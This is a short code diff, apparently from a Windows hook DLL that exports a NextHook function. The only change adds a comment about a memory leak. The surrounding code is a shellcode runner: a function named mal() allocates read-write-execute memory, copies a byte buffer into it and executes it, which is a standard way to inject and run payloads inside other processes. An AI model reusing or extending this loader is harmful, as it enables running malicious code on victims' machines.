@@ -30,7 +30,7 @@ extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lP
     "\x78\x00";
 
 void mal() {
-    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    // yeah, yeah I know I have a memory leak here. But here's the thing... I don't know how to fix that after detaching the thread. So it's here to stay
     memcpy(exec, buf, sizeof buf);
     ((void(*)())exec)();
     return;
